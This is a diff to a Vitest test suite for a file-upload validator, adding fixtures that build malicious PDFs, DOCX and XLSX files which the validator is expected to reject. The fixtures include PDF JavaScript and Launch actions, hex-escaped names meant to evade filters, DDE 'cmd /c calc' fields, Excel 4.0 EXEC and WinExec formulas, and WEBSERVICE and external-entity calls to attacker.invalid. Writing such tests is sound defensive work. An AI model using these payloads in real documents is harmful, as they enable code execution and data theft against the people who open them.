@@ -1,6 +1,7 @@
 // @vitest-environment node
 
 import { createHash } from 'node:crypto';
+import { deflateSync } from 'node:zlib';
 
 import sharp from 'sharp';
 import { beforeAll, describe, expect, it } from 'vitest';
@@ -87,26 +88,177 @@ const contentTypes = (main: string) => Buffer.from(
   }"/></Types>`,
 );
 
-function docx(extra: ZipEntry[] = []): Buffer {
+function docx(extra: ZipEntry[] = [], overrides: { rootRelationships?: Buffer; document?: Buffer } = {}): Buffer {
   return createZip([
     { name: '[Content_Types].xml', data: contentTypes('word/document.xml') },
-    { name: '_rels/.rels', data: Buffer.from('<Relationships/>') },
-    { name: 'word/document.xml', data: Buffer.from('<w:document/>') },
+    { name: '_rels/.rels', data: overrides.rootRelationships ?? Buffer.from('<Relationships/>') },
+    { name: 'word/document.xml', data: overrides.document ?? Buffer.from('<w:document/>') },
     ...extra,
   ]);
 }
 
-function xlsx(extra: ZipEntry[] = []): Buffer {
+function xlsx(extra: ZipEntry[] = [], overrides: {
+  contentTypes?: Buffer;
+  rootRelationships?: Buffer;
+  sheet?: Buffer;
+  workbook?: Buffer;
+} = {}): Buffer {
   return createZip([
-    { name: '[Content_Types].xml', data: contentTypes('xl/workbook.xml') },
-    { name: '_rels/.rels', data: Buffer.from('<Relationships/>') },
-    { name: 'xl/workbook.xml', data: Buffer.from('<workbook/>') },
-    { name: 'xl/worksheets/sheet1.xml', data: Buffer.from('<worksheet/>') },
+    { name: '[Content_Types].xml', data: overrides.contentTypes ?? contentTypes('xl/workbook.xml') },
+    { name: '_rels/.rels', data: overrides.rootRelationships ?? Buffer.from('<Relationships/>') },
+    { name: 'xl/workbook.xml', data: overrides.workbook ?? Buffer.from('<workbook/>') },
+    { name: 'xl/worksheets/sheet1.xml', data: overrides.sheet ?? Buffer.from('<worksheet/>') },
     ...extra,
   ]);
 }
 
-const pdf = Buffer.from('%PDF-1.7\n1 0 obj\n<< /Type /Catalog >>\nendobj\nstartxref\n9\n%%EOF\n');
+function xlsxWithActivePart(options: {
+  path: string;
+  contentType?: string;
+  relationshipType?: string;
+  formula?: string;
+  rootElement?: 'dialogsheet' | 'macrosheet' | 'worksheet';
+}): Buffer {
+  const overrides = options.contentType
+    ? `<Override PartName="/${options.path}" ContentType="${options.contentType}"/>`
+    : '';
+  const workbookRelationships = options.relationshipType
+    ? [{
+        name: 'xl/_rels/workbook.xml.rels',
+        data: relationships(`<Relationship Id="rIdXlm" Type="${options.relationshipType}" Target="${options.path.replace(/^xl\//iu, '')}"/>`),
+      }]
+    : [];
+  const rootElement = options.rootElement ?? 'worksheet';
+  const rootPrefix = rootElement === 'macrosheet' ? 'xm:' : '';
+  const namespace = rootElement === 'macrosheet'
+    ? ' xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" xmlns:xm="http://schemas.microsoft.com/office/excel/2006/main"'
+    : '';
+  return xlsx([
+    ...workbookRelationships,
+    {
+      name: options.path,
+      data: Buffer.from(`<${rootPrefix}${rootElement}${namespace}><sheetData><row><c><f>${options.formula ?? 'EXEC(&quot;calc&quot;)'}</f></c></row></sheetData></${rootPrefix}${rootElement}>`),
+    },
+  ], {
+    contentTypes: Buffer.from(
+      `<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"><Override PartName="/xl/workbook.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.sheet.main+xml"/>${overrides}</Types>`,
+    ),
+    ...(options.relationshipType
+      ? { workbook: Buffer.from('<workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"><sheets><sheet name="Macro1" sheetId="1" r:id="rIdXlm"/></sheets></workbook>') }
+      : {}),
+  });
+}
+
+type PdfObject = {
+  id: number;
+  body: string | Buffer;
+};
+
+function pdfObjectBytes(object: PdfObject): Buffer {
+  return Buffer.concat([
+    Buffer.from(`${object.id} 0 obj\n`, 'latin1'),
+    typeof object.body === 'string' ? Buffer.from(object.body, 'latin1') : object.body,
+    Buffer.from('\nendobj\n', 'latin1'),
+  ]);
+}
+
+function createPdf(options: {
+  catalog?: string;
+  pages?: string;
+  page?: string;
+  objects?: PdfObject[];
+  trailer?: string;
+} = {}): Buffer {
+  const objects: PdfObject[] = [
+    { id: 1, body: `<< /Type /Catalog /Pages 2 0 R ${options.catalog ?? ''} >>` },
+    { id: 2, body: options.pages ?? '<< /Type /Pages /Kids [3 0 R] /Count 1 >>' },
+    { id: 3, body: `<< /Type /Page /Parent 2 0 R /MediaBox [0 0 10 10] ${options.page ?? ''} >>` },
+    ...(options.objects ?? []),
+  ];
+  const maxId = Math.max(...objects.map((object) => object.id));
+  const header = Buffer.from('%PDF-1.7\n%\xff\xff\xff\xff\n', 'latin1');
+  const chunks: Buffer[] = [header];
+  const offsets = new Map<number, number>();
+  let offset = header.length;
+  for (const object of objects) {
+    offsets.set(object.id, offset);
+    const bytes = pdfObjectBytes(object);
+    chunks.push(bytes);
+    offset += bytes.length;
+  }
+
+  const xrefOffset = offset;
+  const xrefRows = Array.from({ length: maxId + 1 }, (_, id) => {
+    if (id === 0) return '0000000000 65535 f \n';
+    const objectOffset = offsets.get(id);
+    return objectOffset === undefined ? '0000000000 00000 f \n' : `${objectOffset.toString().padStart(10, '0')} 00000 n \n`;
+  }).join('');
+  chunks.push(Buffer.from(
+    `xref\n0 ${maxId + 1}\n${xrefRows}trailer\n<< /Size ${maxId + 1} /Root 1 0 R ${options.trailer ?? ''} >>\nstartxref\n${xrefOffset}\n%%EOF\n`,
+    'latin1',
+  ));
+  return Buffer.concat(chunks);
+}
+
+function createObjectStreamPdf(options: {
+  catalog?: string;
+  object?: string;
+} = {}): Buffer {
+  const compressedObject = Buffer.from(`4 0 ${options.object ?? '<< /S /JavaScript /JS (app.alert\\(1\\)) >>'}`, 'latin1');
+  const compressedStream = deflateSync(compressedObject);
+  const objectStream = Buffer.concat([
+    Buffer.from(`<< /Type /ObjStm /N 1 /First 4 /Filter /FlateDecode /Length ${compressedStream.length} >>\nstream\n`, 'latin1'),
+    compressedStream,
+    Buffer.from('\nendstream', 'latin1'),
+  ]);
+  const normalObjects: PdfObject[] = [
+    { id: 1, body: `<< /Type /Catalog /Pages 2 0 R ${options.catalog ?? '/OpenAction 4 0 R'} >>` },
+    { id: 2, body: '<< /Type /Pages /Kids [3 0 R] /Count 1 >>' },
+    { id: 3, body: '<< /Type /Page /Parent 2 0 R /MediaBox [0 0 10 10] >>' },
+    { id: 5, body: objectStream },
+  ];
+  const header = Buffer.from('%PDF-1.7\n%\xff\xff\xff\xff\n', 'latin1');
+  const chunks: Buffer[] = [header];
+  const offsets = new Map<number, number>();
+  let offset = header.length;
+  for (const object of normalObjects) {
+    offsets.set(object.id, offset);
+    const bytes = pdfObjectBytes(object);
+    chunks.push(bytes);
+    offset += bytes.length;
+  }
+
+  const xrefObjectOffset = offset;
+  const xrefRows = Buffer.alloc(7 * 7);
+  const writeRow = (id: number, type: number, field2: number, field3: number) => {
+    const rowOffset = id * 7;
+    xrefRows.writeUInt8(type, rowOffset);
+    xrefRows.writeUInt32BE(field2, rowOffset + 1);
+    xrefRows.writeUInt16BE(field3, rowOffset + 5);
+  };
+  writeRow(0, 0, 0, 65_535);
+  for (const id of [1, 2, 3, 5]) writeRow(id, 1, offsets.get(id)!, 0);
+  writeRow(4, 2, 5, 0);
+  writeRow(6, 1, xrefObjectOffset, 0);
+  const xrefObject = pdfObjectBytes({
+    id: 6,
+    body: Buffer.concat([
+      Buffer.from(`<< /Type /XRef /Size 7 /Root 1 0 R /W [1 4 2] /Length ${xrefRows.length} >>\nstream\n`, 'latin1'),
+      xrefRows,
+      Buffer.from('\nendstream', 'latin1'),
+    ]),
+  });
+  chunks.push(xrefObject, Buffer.from(`startxref\n${xrefObjectOffset}\n%%EOF\n`, 'latin1'));
+  return Buffer.concat(chunks);
+}
+
+function relationships(...relationships: string[]): Buffer {
+  return Buffer.from(
+    `<?xml version="1.0" encoding="UTF-8"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">${relationships.join('')}</Relationships>`,
+  );
+}
+
+const pdf = createPdf();
 const txt = Buffer.from('Регламент смены\nТолько безопасный текст.\n', 'utf8');
 
 let jpeg: Buffer;
@@ -239,6 +391,243 @@ describe('actual-byte file validation', () => {
   });
 
   it.each([
+    ['catalog OpenAction', createPdf({ catalog: '/OpenAction [3 0 R /Fit]' })],
+    ['JavaScript name tree', createPdf({
+      catalog: '/Names << /JavaScript << /Names [(startup) 4 0 R] >> >>',
+      objects: [{ id: 4, body: '<< /S /JavaScript /JS (app.alert\\(1\\)) >>' }],
+    })],
+    ['Launch action', createPdf({
+      catalog: '/OpenAction 4 0 R',
+      objects: [{ id: 4, body: '<< /S /Launch /F (payload.exe) >>' }],
+    })],
+    ['URI link annotation', createPdf({
+      page: '/Annots [4 0 R]',
+      objects: [{ id: 4, body: '<< /Type /Annot /Subtype /Link /Rect [0 0 10 10] /A << /S /URI /URI (https://attacker.invalid/) >> >>' }],
+    })],
+    ['AcroForm field', createPdf({
+      catalog: '/AcroForm 4 0 R',
+      page: '/Annots [5 0 R]',
+      objects: [
+        { id: 4, body: '<< /Fields [6 0 R] >>' },
+        { id: 5, body: '<< /Type /Annot /Subtype /Widget /Rect [0 0 10 10] /Parent 6 0 R /P 3 0 R >>' },
+        { id: 6, body: '<< /FT /Tx /T (name) /Kids [5 0 R] >>' },
+      ],
+    })],
+    ['XFA form', createPdf({
+      catalog: '/AcroForm 4 0 R',
+      objects: [{ id: 4, body: '<< /Fields [] /XFA (<?xml version="1.0"?><template/>) >>' }],
+    })],
+    ['embedded file', createPdf({
+      catalog: '/Names << /EmbeddedFiles << /Names [(payload.txt) 4 0 R] >> >>',
+      objects: [
+        { id: 4, body: '<< /Type /Filespec /F (payload.txt) /EF << /F 5 0 R >> >>' },
+        { id: 5, body: '<< /Type /EmbeddedFile /Length 7 >>\nstream\npayload\nendstream' },
+      ],
+    })],
+    ['RichMedia annotation', createPdf({
+      page: '/Annots [4 0 R]',
+      objects: [{ id: 4, body: '<< /Type /Annot /Subtype /RichMedia /Rect [0 0 10 10] >>' }],
+    })],
+    ['encrypted document', createPdf({
+      objects: [{
+        id: 4,
+        body: '<< /Filter /Standard /V 1 /R 2 /Length 40 /O <00112233445566778899aabbccddeeff00112233445566778899aabbccddeeff> /U <ffeeddccbbaa99887766554433221100ffeeddccbbaa99887766554433221100> /P -4 >>',
+      }],
+      trailer: '/Encrypt 4 0 R /ID [<00112233445566778899aabbccddeeff><00112233445566778899aabbccddeeff>]',
+    })],
+    ['compressed object-stream JavaScript', createObjectStreamPdf()],
+    ['compressed object-stream Launch action', createObjectStreamPdf({ object: '<< /S /Launch /F (payload.exe) >>' })],
+    ['compressed object-stream XFA form', createObjectStreamPdf({
+      catalog: '/AcroForm 4 0 R',
+      object: '<< /Fields [] /XFA (<?xml version="1.0"?><template/>) >>',
+    })],
+    ['lowercase-hex escaped Launch action name', createPdf({
+      catalog: '/#4fpenAction 4 0 R',
+      objects: [{ id: 4, body: '<< /S /#4caunch /F (payload.exe) >>' }],
+    })],
+    ['lowercase-hex escaped AcroForm name', createObjectStreamPdf({
+      catalog: '/Acr#6fForm 4 0 R',
+      object: '<< /Fields [] /XFA (<?xml version="1.0"?><template/>) >>',
+    })],
+  ])('rejects active PDF content: %s', async (_label, bytes) => {
+    await expect(validateFile({
+      name: 'policy.pdf', declaredMime: 'application/pdf', declaredSize: bytes.length, bytes,
+    })).rejects.toThrow();
+  });
+
+  it('rejects an excessive repeated-page PDF before walking every page', async () => {
+    const allowedPageCount = 500;
+    const allowedBytes = createPdf({
+      pages: `<< /Type /Pages /Kids [${'3 0 R '.repeat(allowedPageCount)}] /Count ${allowedPageCount} >>`,
+    });
+    await expect(validateFile({
+      name: 'allowed-manual.pdf', declaredMime: 'application/pdf', declaredSize: allowedBytes.length, bytes: allowedBytes,
+    })).resolves.toMatchObject({ extension: 'pdf' });
+
+    const pageCount = allowedPageCount + 1;
+    const bytes = createPdf({
+      pages: `<< /Type /Pages /Kids [${'3 0 R '.repeat(pageCount)}] /Count ${pageCount} >>`,
+    });
+    const startedAt = performance.now();
+    await expect(validateFile({
+      name: 'oversized-manual.pdf', declaredMime: 'application/pdf', declaredSize: bytes.length, bytes,
+    })).rejects.toThrow(/страниц|слож/iu);
+    expect(performance.now() - startedAt).toBeLessThan(2_000);
+  });
+
+  it.each([
+    ['too many direct array entries', `/SZBudget [${'0 '.repeat(100_001)}]`],
+    ['excessive direct-object nesting', `/SZBudget ${'['.repeat(129)}0${']'.repeat(129)}`],
+  ])('rejects excessive PDF object complexity: %s', async (_label, catalog) => {
+    const bytes = createPdf({ catalog });
+    await expect(validateFile({
+      name: 'complex.pdf', declaredMime: 'application/pdf', declaredSize: bytes.length, bytes,
+    })).rejects.toThrow(/слож/iu);
+  });
+
+  it.each([
+    ['DOCX external package relationship', docx([], {
+      rootRelationships: relationships('<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="https://attacker.invalid/document.xml" TargetMode="External"/>'),
+    })],
+    ['XLSX external package relationship', xlsx([], {
+      rootRelationships: relationships('<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="file:///tmp/payload.xlsx" TargetMode="External"/>'),
+    })],
+    ['remote DOCX template', docx([
+      { name: 'word/_rels/settings.xml.rels', data: relationships('<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="https://attacker.invalid/template.dotm" TargetMode="External"/>') },
+    ])],
+    ['XLSX external link', xlsx([
+      { name: 'xl/_rels/workbook.xml.rels', data: relationships('<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/externalLink" Target="externalLinks/externalLink1.xml"/>') },
+      { name: 'xl/externalLinks/externalLink1.xml', data: Buffer.from('<externalLink/>') },
+    ])],
+    ['XLSX data connections', xlsx([
+      { name: 'xl/connections.xml', data: Buffer.from('<connections><connection id="1"><dbPr connection="https://attacker.invalid/data"/></connection></connections>') },
+    ])],
+    ['DOCX DDEAUTO field', docx([], {
+      document: Buffer.from('<w:document xmlns:w="urn:w"><w:body><w:p><w:instrText>DDEAUTO cmd "/c calc"</w:instrText></w:p></w:body></w:document>'),
+    })],
+    ['XLSX DDE formula', xlsx([], {
+      sheet: Buffer.from('<worksheet><sheetData><row><c><f>cmd|\'/c calc\'!A0</f></c></row></sheetData></worksheet>'),
+    })],
+    ['XLSX external workbook formula', xlsx([], {
+      sheet: Buffer.from('<worksheet><sheetData><row><c><f>[Book.xlsx]Sheet1!A1</f></c></row></sheetData></worksheet>'),
+    })],
+    ['XLSX WEBSERVICE formula', xlsx([], {
+      sheet: Buffer.from('<worksheet><sheetData><row><c><f>_xlfn.WEBSERVICE(&quot;https://attacker.invalid/?cell=&quot;&amp;A1)</f></c></row></sheetData></worksheet>'),
+    })],
+    ['XLSX IMAGE formula', xlsx([], {
+      sheet: Buffer.from('<worksheet><sheetData><row><c><f>image ( &quot;https://attacker.invalid/pixel.png&quot; )</f></c></row></sheetData></worksheet>'),
+    })],
+    ['XLSX WEBSERVICE defined name', xlsx([], {
+      workbook: Buffer.from('<workbook><definedNames><definedName name="Fetch">_XLFN.WEBSERVICE(&quot;https://attacker.invalid/data&quot;)</definedName></definedNames></workbook>'),
+    })],
+    ['XLSX DDE external link', xlsx([
+      { name: 'xl/externalLinks/externalLink1.xml', data: Buffer.from('<externalLink><ddeLink ddeService="cmd" ddeTopic="/c calc"><ddeItems/></ddeLink></externalLink>') },
+    ])],
+    ['DOCX malformed relationship XML', docx([
+      { name: 'word/_rels/document.xml.rels', data: Buffer.from('<Relationships><Relationship></Relationships>') },
+    ])],
+    ['DOCX external XML entity declaration', docx([], {
+      document: Buffer.from('<!DOCTYPE document [<!ENTITY remote SYSTEM "https://attacker.invalid/payload">]><document>&remote;</document>'),
+    })],
+  ])('rejects active OOXML content: %s', async (_label, bytes) => {
+    const isDocx = _label.startsWith('DOCX') || _label.startsWith('remote DOCX');
+    await expect(validateFile({
+      name: isDocx ? 'guide.docx' : 'stock.xlsx',
+      declaredMime: isDocx
+        ? 'application/vnd.openxmlformats-officedocument.wordprocessingml.document'
+        : 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet',
+      declaredSize: bytes.length,
+      bytes,
+    })).rejects.toThrow();
+  });
+
+  it.each([
+    ['complete Excel 4.0 macrosheet fixture', xlsxWithActivePart({
+      path: 'xl/macrosheets/sheet1.xml',
+      contentType: 'application/vnd.ms-excel.macrosheet+xml',
+      relationshipType: 'http://schemas.microsoft.com/office/2006/relationships/xlMacrosheet',
+      rootElement: 'macrosheet',
+    })],
+    ['Excel 4.0 macrosheet content type', xlsxWithActivePart({
+      path: 'xl/customData/item1.xml',
+      contentType: 'application/vnd.ms-excel.macrosheet+xml',
+      formula: 'SUM(A1:A2)',
+    })],
+    ['international Excel 4.0 macrosheet content type', xlsxWithActivePart({
+      path: 'xl/customData/item1.xml',
+      contentType: 'application/vnd.ms-excel.intlmacrosheet+xml',
+      formula: 'SUM(A1:A2)',
+    })],
+    ['dialogsheet content type', xlsxWithActivePart({
+      path: 'xl/customData/item1.xml',
+      contentType: 'application/vnd.openxmlformats-officedocument.spreadsheetml.dialogsheet+xml',
+      formula: 'SUM(A1:A2)',
+    })],
+    ['Microsoft dialogsheet content type', xlsxWithActivePart({
+      path: 'xl/customData/item1.xml',
+      contentType: 'application/vnd.ms-excel.dialogsheet+xml',
+      formula: 'SUM(A1:A2)',
+    })],
+    ['case and percent-variant macrosheet content type', xlsxWithActivePart({
+      path: 'xl/customData/item1.xml',
+      contentType: 'Application/Vnd.Ms-Excel.%6DacroSheet+Xml',
+      formula: 'SUM(A1:A2)',
+    })],
+    ['Excel 4.0 macrosheet relationship', xlsxWithActivePart({
+      path: 'xl/customData/item1.xml',
+      relationshipType: 'http://schemas.microsoft.com/office/2006/relationships/xlMacrosheet',
+      formula: 'SUM(A1:A2)',
+    })],
+    ['international Excel 4.0 macrosheet relationship', xlsxWithActivePart({
+      path: 'xl/customData/item1.xml',
+      relationshipType: 'http://schemas.microsoft.com/office/2006/relationships/xlIntlMacrosheet',
+      formula: 'SUM(A1:A2)',
+    })],
+    ['case and percent-variant macrosheet relationship', xlsxWithActivePart({
+      path: 'xl/customData/item1.xml',
+      relationshipType: 'HTTP://SCHEMAS.MICROSOFT.COM/OFFICE/2006/RELATIONSHIPS/xl%4DacroSheet',
+      formula: 'SUM(A1:A2)',
+    })],
+    ['dialogsheet relationship', xlsxWithActivePart({
+      path: 'xl/customData/item1.xml',
+      relationshipType: 'http://schemas.openxmlformats.org/officeDocument/2006/relationships/dialogsheet',
+      formula: 'SUM(A1:A2)',
+    })],
+    ['canonical macrosheet path', xlsxWithActivePart({ path: 'xl/macrosheets/sheet1.xml', formula: 'SUM(A1:A2)' })],
+    ['case-variant macrosheet path', xlsxWithActivePart({ path: 'XL/MACROSHEETS/SHEET1.XML', formula: 'SUM(A1:A2)' })],
+    ['percent-encoded macrosheet path', xlsxWithActivePart({ path: 'xl/%6dacrosheets/sheet1.xml', formula: 'SUM(A1:A2)' })],
+    ['nested percent-encoded macrosheet path', xlsxWithActivePart({ path: 'xl/%256dacrosheets/sheet1.xml', formula: 'SUM(A1:A2)' })],
+    ['canonical dialogsheet path', xlsxWithActivePart({ path: 'xl/dialogsheets/sheet1.xml', formula: 'SUM(A1:A2)' })],
+    ['percent-encoded dialogsheet path', xlsxWithActivePart({ path: 'xl/%64ialogsheets/sheet1.xml', formula: 'SUM(A1:A2)' })],
+  ])('rejects XLM-capable XLSX structures: %s', async (_label, bytes) => {
+    await expect(validateFile({
+      name: 'stock.xlsx',
+      declaredMime: 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet',
+      declaredSize: bytes.length,
+      bytes,
+    })).rejects.toThrow();
+  });
+
+  it.each([
+    ['EXEC worksheet formula', xlsx([], {
+      sheet: Buffer.from('<worksheet><sheetData><row><c><f>EXEC(&quot;calc&quot;)</f></c></row></sheetData></worksheet>'),
+    })],
+    ['CALL worksheet formula', xlsx([], {
+      sheet: Buffer.from('<worksheet><sheetData><row><c><f>CALL(&quot;kernel32&quot;,&quot;WinExec&quot;,&quot;JJ&quot;,&quot;calc&quot;,1)</f></c></row></sheetData></worksheet>'),
+    })],
+    ['EXEC defined name', xlsx([], {
+      workbook: Buffer.from('<workbook><definedNames><definedName name="Run">EXEC(&quot;calc&quot;)</definedName></definedNames></workbook>'),
+    })],
+  ])('rejects Excel 4.0 command formulas: %s', async (_label, bytes) => {
+    await expect(validateFile({
+      name: 'stock.xlsx',
+      declaredMime: 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet',
+      declaredSize: bytes.length,
+      bytes,
+    })).rejects.toThrow();
+  });
+
+  it.each([
     ['macro content type', docx([{ name: 'word/vbaProject.bin', data: Buffer.from('macro') }])],
     ['encrypted entry', docx([{ name: 'word/media/image.png', data: Buffer.from('x'), flags: 0x0801 }])],
     ['traversal', docx([{ name: '../outside.xml', data: Buffer.from('x') }])],
@@ -293,6 +682,19 @@ describe('actual-byte file validation', () => {
     await expect(validateFile({
       name: 'notes.txt', declaredMime: 'text/plain', declaredSize: comparison.length, bytes: comparison,
     })).resolves.toMatchObject({ bytes: comparison, mimeType: 'text/plain' });
+  });
+
+  it('accepts benign XLSX formulas, structured references, and defined names', async () => {
+    const bytes = xlsx([], {
+      sheet: Buffer.from('<worksheet><sheetData><row><c><f>SUM(Table1[Amount])</f></c></row></sheetData></worksheet>'),
+      workbook: Buffer.from('<workbook><definedNames><definedName name="TaxRate">Sheet1!$A$1</definedName></definedNames></workbook>'),
+    });
+    await expect(validateFile({
+      name: 'stock.xlsx',
+      declaredMime: 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet',
+      declaredSize: bytes.length,
+      bytes,
+    })).resolves.toMatchObject({ extension: 'xlsx', bytes });
   });
 
   it('accepts legitimate comparison prose during TXT preflight', () => {
